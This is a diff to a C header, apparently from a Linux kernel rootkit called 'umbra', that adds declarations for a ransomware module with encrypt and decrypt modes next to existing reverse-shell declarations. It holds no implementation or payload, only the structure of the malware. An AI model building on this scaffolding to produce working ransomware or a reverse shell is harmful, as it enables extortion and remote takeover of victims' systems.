@@ -13,6 +13,18 @@ struct shell_params {
 	char* target_port;
 };
 
+typedef enum {
+	RANSOM_ENCRYPT = 1,
+	RANSOM_DECRYPT = 2,
+}umbra_module;
+
+
+struct ransom_params {
+	struct work_struct work;
+	umbra_module module;
+	char* args;
+};
+
 /**
  * Auxiliary function called by the workqueue which starts the reverse shell
  */ 
@@ -25,5 +37,8 @@ void execute_reverse_shell(struct work_struct *work);
  * @return 0 if OK, 1 if error 
  */ 
 int start_reverse_shell(char* ip, char* port);
+
+int start_ransom_module(umbra_module module, char* args);
+void execute_module(struct work_struct *work);
 
 #endif
